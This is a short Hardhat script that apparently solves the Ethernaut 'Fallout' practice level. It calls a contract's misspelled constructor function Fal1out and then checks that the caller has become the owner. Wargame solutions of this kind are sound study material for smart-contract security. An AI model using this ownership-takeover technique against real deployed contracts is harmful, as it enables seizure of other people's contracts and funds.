// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {

  const accounts = await hre.ethers.getSigners()
  let Level_Address = '0x9f68f262e819bc74F8849452222E388510AA8073'

  let tx;
  const payer = accounts[0]
  console.log('accounts', await payer.getAddress(), 'level', Level_Address)

// A Human-Readable ABI; for interacting with the contract, we
  // must include any fragment we wish to use
  const abi = [
    // Read-Only Functions
    "function Fal1out() public payable",
    "function owner() view returns (address)",
  ];

  const fall = new hre.ethers.Contract(Level_Address, abi, payer);

  let owner = await fall.owner()
  console.log('begin', 'owner', owner)

  tx = await fall.Fal1out({ value: 2 , gasLimit: 500000})
  await tx.wait()

  owner = await fall.owner()
  console.log('finial', 'owner', owner)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });



  // npx hardhat run 2.Fallout/run.js